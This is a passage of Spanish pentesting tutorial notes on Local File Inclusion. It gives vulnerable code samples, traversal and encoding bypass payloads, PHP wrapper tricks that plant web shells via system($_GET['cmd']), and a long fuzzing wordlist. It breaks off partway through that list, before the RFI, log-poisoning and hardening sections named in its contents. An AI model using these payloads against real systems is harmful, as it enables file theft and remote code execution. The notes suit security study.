# LOCAL FILE INCLUSION

## Table of contents

- [LOCAL FILE INCLUSION](#local-file-inclusion)
  - [INTRODUCCION](#introduccion)
  - [ejemplos de codigos vulnerables](#ejemplos-de-codigos-vulnerables)
    - [PHP](#php)
    - [NODEJS](#nodejs)
    - [.NET](#net)
    - [JAVA](#java)
    - [Leer vs Ejecutar](#leer-vs-ejecutar)
  - [tipos de ataque](#tipos-de-ataque)
    - [BASIC LFI](#basic-lfi)
    - [PATH TRAVERSAL](#path-traversal)
    - [FILENAME PREFIX](#filename-prefix)
    - [Non-Recursive Path Traversal Filters](#non-recursive-path-traversal-filters)
    - [CODIFICACION](#codificacion)
    - [BLACKLIST PATH BYPASS](#blacklist-path-bypass)
    - [EXTENSION ADJUNTA](#extension-adjunta)
      - [TRUNCAMIENTO DE LA RUTA](#truncamiento-de-la-ruta)
      - [BYTES NULOS](#bytes-nulos)
    - [CODIFICACION DOBLE](#codificacion-doble)
    - [UTF-8 ENCODING](#utf-8-encoding)
    - [RUTAS APROBADAS](#rutas-aprobadas)
  - [WRAPPERS](#wrappers)
    - [FILTER](#filter)
    - [ZIP](#zip)
    - [DATA](#data)
    - [INPUT](#input)
  - [DICCIONARIO LFI](#diccionario-lfi)
  - [ARCHIVOS POTENCIALES](#archivos-potenciales)
  - [DE LFI A RCE](#de-lfi-a-rce)
    - [PHP WRAPPERS](#php-wrappers)
      - [wrapper data](#wrapper-data)
      - [wrapper input](#wrapper-input)
      - [wrapper expect](#wrapper-expect)
    - [RFI](#rfi)
      - [HTTP REMOTE FILE](#http-remote-file)
      - [FTP REMOTE FILE](#ftp-remote-file)
      - [SMB REMOTE FILE](#smb-remote-file)
    - [LFI Y FILE UPLOAD](#lfi-y-file-upload)
      - [GIF FILE](#gif-file)
      - [PNG FILE](#png-file)
      - [ZIP FILE](#zip-file)
      - [PHAR](#phar)
    - [Log Poisoning](#log-poisoning)
      - [PHP Sessions](#php-sessions)
      - [access.log & auth.log](#accesslog--authlog)
      - [SSH LOGS](#ssh-logs)
    - [Via /proc/*/fd/*](#via-procfd)
      - [/proc/self/fd ó /dev/fd/](#procselffd--devfd)
    - [Via /proc/self/environ](#via-procselfenviron)
    - [Via carga de archivo ZIP](#via-carga-de-archivo-zip)
    - [Mail PHP Execution](#mail-php-execution)
    - [Via credentials file](#via-credentials-file)
    - [Via phpinfo](#via-phpinfo)
    - [Via el servicio de SSH](#via-el-servicio-de-ssh)
  - [AUTOMATED SCANNING](#automated-scanning)
    - [FUZZING PARAMETROS](#fuzzing-parametros)
    - [FUZZING LFI PAYLOADS](#fuzzing-lfi-payloads)
    - [Fuzzing de archivos del servidor](#fuzzing-de-archivos-del-servidor)
    - [OTHER TOOLS](#other-tools)
- [CHEATSHEET HACK THE BOX](#cheatsheet-hack-the-box)
- [REMOTE FILE INCLUSION](#remote-file-inclusion)
  - [RFI WINDOWS](#rfi-windows)
  - [BYPASS FILTROS](#bypass-filtros)
- [HARDENING](#hardening)
  - [COMPROBACIONES](#comprobaciones)
  - [HARDENING](#hardening)
  - [WAF](#waf)

## INTRODUCCION

Esta vulnerabilidad nos permite visualizar recursos del sistema (dentro de la maquina local) efectuando para ello un **Directory Path Transversal**. Esto mediante la url de la pagina web.

El lugar más común donde encontrará las vulnerabilidades de LFI es dentro de los motores de creación de plantillas. Esto se debe a que los sitios web quieren mantener una gran mayoría del sitio web igual al navegar entre páginas, como el encabezado, la barra de navegación y el pie de página. Sin la generación dinámica de páginas, todas las páginas del servidor deberían modificarse cuando se realicen cambios en cualquiera de esas secciones. Es por eso que a menudo verá un parámetro como `/index.php?page=about`. Bajo el capó, `index.php`probablemente se tire `header.php`, `about.php`y `footer.php`. Dado que usted controla la parte acerca de la solicitud, es posible que el servidor web capture otros archivos. Otro lugar común es el de los idiomas. Si ve `?lang=en`; luego, el sitio web tomará archivos del `/en/`directorio.

Los motores de plantilla no son el único lugar donde se puede descubrir una vulnerabilidad de LFI. Se puede encontrar en cualquier momento que el servidor permita a un usuario descargar un archivo. Por ejemplo, imagina si el código del lado del servidor de Hack The Box para recuperar tu avatar descargado `/profile/$username/avatar.png`. Si logró crear un nombre de usuario malicioso, podría ser posible cambiar esa solicitud de archivo a `/profile/../../../../etc/passwd avatar.png`y tomar en `/etc/passwd`lugar de su avatar. Envenenar la entrada de la base de datos y tener una función separada utiliza esa entrada envenenada se llama "Segundo Orden". Los desarrolladores a menudo pasan por alto estas vulnerabilidades porque tienen la mentalidad de "Nunca confíe en la entrada del usuario". En este ejemplo, la función de recuperación de avatar está obteniendo datos de la base de datos y es posible que el desarrollador no se dé cuenta de que en realidad se trata de una entrada del usuario.

Las vulnerabilidades de inclusión de archivos a menudo se pueden encontrar en los parámetros de solicitud GET. Los scripts del lado del servidor incluyen ciertos archivos basados en la elección o entrada del usuario, por ejemplo, descargas de archivos, elección del idioma o navegación del sitio web.

## ejemplos de codigos vulnerables

### PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

### NODEJS

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### JAVA

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

### Leer vs Ejecutar

Lo más importante a tener en cuenta es que **ALGUNOS DE LAS FUNCIONALIDAD DE ARRIBA SOLO LEEN EL CONTENIDO DEL ARCHIVO, MIENTRAS QUE OTRAS FUNCIONES LO LEEN Y EJECUTAN**. Además, algunos de ellos permiten especificar URL remotas, mientras que otros solo funcionan con archivos locales en el servidor back-end.

![[Pasted image 20230125135042.png]]

## DONDE BUSCAR

- si vemos una imagen podemos darle click derecho y abrirlo en una pestaña aparte y ver en la URL o en body si se llama a traves del nombre de la imagen. Ese nombre puede ser un vector de ataque.
- Todo parametro que llame a algun documento, archivo, imagen, etc.

## tipos de ataque

### BASIC LFI

ejemplo:

```bash
http://localhost/file.php?file=../../../../../etc/passwd

http://localhost/file.php?file=../../../../../etc/shadow
```

mas ejemplos:

```bash
# URL

http://134.209.184.216:32391/basic/index.php?language=es.php

# CODIGO

include($_GET['language']);

# LFI

http://134.209.184.216:32391/basic/index.php?language=/etc/passwd
```

### PATH TRAVERSAL

```bash
# URL

http://134.209.184.216:32391/basic/index.php?language=es.php

# CODIGO

include("./languages/" . $_GET['language']);

# LFI con recorrido de ruta

http://134.209.184.216:32391/traversal/index.php?language=../../../../../../../../../etc/passwd
```

### FILENAME PREFIX

```bash
# URL

http://134.209.184.216:32391/basic/index.php?language=es.php

# CODIGO


include("lang_" . $_GET['language']);

# LFI

http://134.209.184.216:32569/traversal/index_2.php?language=/../../../../../etc/passwd
```

En este escenario, la entrada como `../../../../../etc/passwd` resultará en la cadena final `lang_../../../../../etc/passwd`, que no es válida.

el prefijo a `/`antes de la carga útil omitirá el nombre del archivo y los directorios de recorrido.

### Non-Recursive Path Traversal Filters

```bash
# URL

http://134.209.184.216:32391/basic/index.php?language=es.php

# CODIGO


$language = str_replace('../', '', $_GET['language']);

# LFI CON LISTA NEGRA

http://134.209.184.216:32391/blacklist/index.php?language=....//....//....//....//....//....//....//....//etc/passwd
```

>[!note]
>El payload tiene que ser lo suficientemente largo para retroceder todos los directorios. entonces usar mas de `../` o `....//`.

```bash
# CODIGO PARA REALIZAR UN CORRECTO BLACKLIST


$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};

```

Por supuesto, la mejor manera de parchear esto es usar el `basename($_GET['language'])`, sin embargo, si su aplicación entra en un directorio, esto podría romper la aplicación. Si bien el ejemplo anterior funciona, es mejor intentar encontrar una función nativa en su idioma o marco para realizar la acción. Si crea su propia función para hacer este método, es posible que no esté contabilizando un caso extremo extraño. Por ejemplo, en su terminal bash, vaya directamente a su casa (cd ~) y ejecute el comando `cat .?/.*/.?/etc/passwd`. Verás Bash permite para el `?`y `*`comodines para ser utilizado como un `.`.

>[!tip]
>Ahora escriba `php -a` para ingresar al intérprete de línea de comandos de PHP y ejecutar `echo file_get_contents('.?/.*/.?/etc/passwd');`. Verá que PHP no tiene el mismo comportamiento con los comodines, si reemplaza `?` y `*` con `.`, el comando funcionará como se esperaba. Esto demuestra que hay casos extremos con nuestra función anterior, si hacemos que PHP ejecute bash con la `system` función, el atacante podría omitir nuestra prevención de cruce de directorios. Si usamos funciones nativas en el marco en el que nos encontramos, existe la posibilidad de que otros usuarios detecten casos extremos como este y lo solucionen antes de que se explote en nuestra aplicación web.

En las versiones 5.3.4 de PHP y anteriores, la detección basada en cadenas se podía omitir mediante la codificación de la carga útil mediante URL. Los caracteres `../`se pueden codificar en URL `%2e%2e%2f`, lo que evitará el filtro.

### CODIFICACION

En el último ejemplo, `....// `se puede codificar en URL `%2e%2e%2e%2e%2f%2f`.

La carga útil `%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd` evitará el filtro en la sección anterior.

```bash
# URL

http://134.209.184.216:32391/basic/index.php?language=es.php

# CODIGO

$language = str_replace('../', '', $_GET['language']);

# LFI

http://134.209.184.216:32391/blacklist/index.php?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
```

### BLACKLIST PATH BYPASS

en casos en donde se verifique que no debe existir **../..** en la ruta podemos evadirlo usando el siguiente payload `/.././.././.././../`:

```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd
```

- [https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel)
- [https://hackerone.com/reports/147570](https://hackerone.com/reports/147570)

### EXTENSION ADJUNTA

codigo de ejemplo:

```php
include($_GET['language'] . ".php");
```

>[!note]
>Con las versiones modernas de PHP, es posible que no podamos eludir esto y que solo podamos leer archivos en esa extensión, lo que aún puede ser útil, como veremos en la siguiente sección (por ejemplo, para leer el código fuente).

#### TRUNCAMIENTO DE LA RUTA

En versiones anteriores de PHP, las cadenas definidas tienen una longitud máxima de 4096 caracteres, probablemente debido a la limitación de los sistemas de 32 bits. Si se pasa una cadena más larga, simplemente será `trucada`, y se ignorarán los caracteres después de la longitud máxima.

Además, PHP también solía eliminar las barras inclinadas y los puntos individuales en los nombres de las rutas, por lo que si llamamos a ( `/etc/passwd/.`), el `/.` se truncaría y PHP llamaría a ( `/etc/passwd`)

PHP, y los sistemas Linux en general, también ignoran múltiples barras en la ruta (por ejemplo, `////etc/passwd`es lo mismo que `/etc/passwd`).

Si combinamos ambas limitaciones de PHP juntas, podemos crear cadenas muy largas que evalúen una ruta correcta. Cada vez que alcancemos el límite de 4096 caracteres, la extensión añadida ( `.php`) se truncaría y tendríamos una ruta sin una extensión añadida. Finalmente, también es importante tener en cuenta que también necesitaríamos  un `inicio de path con un directorio que no existe` para que esta técnica funcione.

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Por supuesto, no tenemos que escribir manualmente `./`2048 veces (un total de 4096 caracteres), pero podemos automatizar la creación de esta cadena con el siguiente comando:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

#### BYTES NULOS

Las versiones de PHP anteriores a la 5.5 eran vulnerables a `null byte injection`, lo que significa que agregar un byte nulo ( `%00`) al final de la cadena terminaría la cadena y no consideraría nada después de ella. Esto se debe a cómo las cadenas se almacenan en la memoria de bajo nivel, donde las cadenas en la memoria deben usar un byte nulo para indicar el final de la cadena, como se ve en los lenguajes ensamblador, C o C++.

Para aprovechar esta vulnerabilidad, podemos terminar nuestra carga útil con un byte nulo (por ejemplo `/etc/passwd%00`, ), de modo que la ruta final a la que se pasa `include()`sea ( `/etc/passwd%00.php`). De esta manera, aunque se agregue a nuestra cadena `.php`, todo lo que se encuentre después del byte nulo se truncará y, por lo tanto, la ruta utilizada en realidad será `/etc/passwd`, lo que nos llevará a omitir la extensión adjunta.

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

```bash
/image?filename=../../../etc/passwd%00.jpg
```

### CODIFICACION DOBLE

A veces se hace el uso del doble url encoding:

%2f: es '/' en urlencode
%2e: es '.' en urlencode

en doble encoding tenemos esto:

%252f: es '/' en urlencode doble
%252e: es '.' en urlencode doble

```bash
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=
http://example.com/index.php?page=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%252f..%252f..%252fetc/passwd
```

### UTF-8 ENCODING

en utf-8 encoding:

```bash
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

```

bypass de filtros:

```bash
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

```

### RUTAS APROBADAS

Algunas aplicaciones web también pueden usar expresiones regulares para garantizar que el archivo que se incluye se encuentre en una ruta específica. Por ejemplo, la aplicación web con la que hemos estado tratando solo puede aceptar rutas que estén bajo el directorio `./languages`, de la siguiente manera:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Para encontrar la ruta aprobada, podemos examinar las solicitudes enviadas por los formularios existentes y ver qué ruta usan para la funcionalidad web normal. Además, podemos fuzzear directorios web bajo la misma ruta y probar diferentes hasta que consigamos una coincidencia. Para omitir esto, podemos usar el recorrido de la ruta y comenzar nuestra carga útil con la ruta aprobada, y luego usar `../`para volver al directorio raíz y leer el archivo que especificamos, de la siguiente manera:

```bash
/index.php?language=./languages/../../../../etc/passwd
```

## WRAPPERS

Mediante los wrappers nosotros podemos leer desde la web contenido que seria interpretado ya que lo podemos encodear para leer en nuestro equipo.

Los wrappers nos permitiran leer el contenido de archivos **.php** por lo que podemos empezar haciendo fuzzing para encontrarlos:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

### FILTER

**php://filter** es una especie de meta-envoltura diseñada para permitir aplicar  a los flujos en las aperturas. Esto es muy útil en las funciones todo en uno, como **readfile()**, **file()** y **file_get_contents()** donde, por otra parte, no se pueden aplicar filtros a los flujos antes de que se lea su contenido. 

```bash
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

```

por ejemplo un archivo php y asi poder ver el codigo fuente:

```bash

#convirtiendo en base64

curl --silent "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d > config.php
```

El envoltorio de **filter** a veces se puede usar como un bypass simplemente especificando el recurso que queremos sin ningún tipo de codificación.

```bash
php://filter/resource=/etc/passwd
```

[filter wrapper](https://www.php.net/manual/es/wrappers.php.php)

>[!note]
>En algunas aplicaciones web, se agrega automaticamente la extension, por lo que ya no es necesario colocarlo en el payload:
>
>```bash
>?page=php://filter/convert.base64-encode/resource=config
>```


tambien podemos ler el contenido en rot13 y despues decodificarlo:

```bash
?language=php://filter/read=string.rot13/resource=configure
```

![[Pasted image 20230125151456.png]]

![[Pasted image 20230125151608.png]]

### ZIP

PHP permite leer archivos ZIP sobre la marcha con el wrapper **zip://**

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

```

[zip wrapper](hthttps://www.php.net/manual/en/wrappers.compression.php)

### DATA

Permite la inclusión de pequeños elementos de datos como datos "inmediatos", como si se hubieran incluido externamente.

Este Wrapper nos permite ejecutar directamente código PHP:

```bash
data:text/plain,<?php system("id")?> 

data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=
```

```bash
<?php  
// prints "I love PHP"  
echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');  
?>
```

```bash
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

```bash
http://example.com/index.php?file=data:,<?system($_GET['x']);?>&x=ls
```

### INPUT

Especifique su carga útil en los parámetros POST, esto se puede hacer con un  curl comando simple .

```bash
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

```bash
Encoding is required while reading .php source: 

<?php echo base64_encode(file_get_contents("solution.php"));?> 

OR just use 

<?php system('cat x.php');?>
```

## DICCIONARIO LFI

Puedes hacer fuzzing de archivos interesantes una vez validado que tienes un LFI:

- [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
- [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

puedes validar tu LFI con este diccionario:

```bash
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../etc/passwd
file:///etc/passwd
file://../etc/passwd
file://../../etc/passwd
file://../../../etc/passwd
file://../../../../etc/passwd
file://../../../../../etc/passwd
file://../../../../../../etc/passwd
file://../../../../../../../etc/passwd
file://../../../../../../../../etc/passwd
file://../../../../../../../../../etc/passwd
file://../../../../../../../../../../etc/passwd
file://../../../../../../../../../../../etc/passwd
file://../../../../../../../../../../../../etc/passwd
file://../../../../../../../../../../../../../etc/passwd
file://../../../../../../../../../../../../../../etc/passwd
file://../../../../../../../../../../../../../../../etc/passwd
/../etc/passwd
/../../etc/passwd
/../../../etc/passwd
/../../../../etc/passwd
/../../../../../etc/passwd
/../../../../../../etc/passwd
/../../../../../../../etc/passwd
/../../../../../../../../etc/passwd
/../../../../../../../../../etc/passwd
/../../../../../../../../../../etc/passwd
/../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../../../../etc/passwd
file:///../etc/passwd
file:///../../etc/passwd
file:///../../../etc/passwd
file:///../../../../etc/passwd
file:///../../../../../etc/passwd
file:///../../../../../../etc/passwd
file:///../../../../../../../etc/passwd
file:///../../../../../../../../etc/passwd
file:///../../../../../../../../../etc/passwd
file:///../../../../../../../../../../etc/passwd
file:///../../../../../../../../../../../etc/passwd
file:///../../../../../../../../../../../../etc/passwd
file:///../../../../../../../../../../../../../etc/passwd
file:///../../../../../../../../../../../../../../etc/passwd
file:///../../../../../../../../../../../../../../../etc/passwd
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
file://....//etc/passwd
file://....//....//etc/passwd
file://....//....//....//etc/passwd
file://....//....//....//....//etc/passwd
file://....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
file://....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd
..%252fetc%252fpasswd
..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
/%5C../%5C../etc/passwd
/%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/images/../../../etc/passwd
/images/../../../../etc/passwd
/images/../../../../../etc/passwd
/images/../../../../../../etc/passwd
/images/../../../../../../../etc/passwd
/images/../../../../../../../../etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/../../../../etc/passwd
/var/www/images/../../../../../etc/passwd
/var/www/images/../../../../../../etc/passwd
/var/www/images/../../../../../../../etc/passwd
/var/www/images/../../../../../../../../etc/passwd
/etc/passwd%00
../etc/passwd%00
../../etc/passwd%00
../../../etc/passwd%00
../../../../etc/passwd%00
../../../../../etc/passwd%00
../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00
../../../../../../../../etc/passwd%00
../../../../../../../../../etc/passwd%00
../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../../../etc/passwd%00
file:///etc/passwd%00
file://../etc/passwd%00
file://../../etc/passwd%00
file://../../../etc/passwd%00
file://../../../../etc/passwd%00
file://../../../../../etc/passwd%00
file://../../../../../../etc/passwd%00
file://../../../../../../../etc/passwd%00
file://../../../../../../../../etc/passwd%00
file://../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../../../../../etc/passwd%00
file://../../../../../../../../../../../../../../../etc/passwd%00
/../etc/passwd%00
/../../etc/passwd%00
/../../../etc/passwd%00
/../../../../etc/passwd%00
/../../../../../etc/passwd%00
/../../../../../../etc/passwd%00
/../../../../../../../etc/passwd%00
/../../../../../../../../etc/passwd%00
/../../../../../../../../../etc/passwd%00
/../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../../../../../etc/passwd%00
file:///../etc/passwd%00
file:///../../etc/passwd%00
file:///../../../etc/passwd%00
file:///../../../../etc/passwd%00
file:///../../../../../etc/passwd%00
file:///../../../../../../etc/passwd%00
file:///../../../../../../../etc/passwd%00
file:///../../../../../../../../etc/passwd%00
file:///../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../../../../../etc/passwd%00
file:///../../../../../../../../../../../../../../../etc/passwd%00
....//etc/passwd%00
....//....//etc/passwd%00
....//....//....//etc/passwd%00
....//....//....//....//etc/passwd%00
....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
